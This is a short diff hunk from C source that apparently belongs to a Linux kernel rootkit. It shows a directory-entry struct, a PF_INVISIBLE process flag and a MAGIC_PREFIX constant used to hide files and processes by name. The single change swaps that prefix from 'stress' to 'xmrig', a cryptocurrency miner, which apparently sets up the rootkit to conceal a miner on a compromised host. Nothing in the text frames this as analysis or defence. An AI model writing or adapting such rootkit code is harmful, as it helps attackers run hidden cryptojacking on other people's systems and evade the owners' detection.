@@ -5,7 +5,7 @@ struct linux_dirent {
         char            d_name[1];
 };
 
-#define MAGIC_PREFIX "stress"
+#define MAGIC_PREFIX "xmrig"
 #define PF_INVISIBLE 0x10000000
 
 enum {
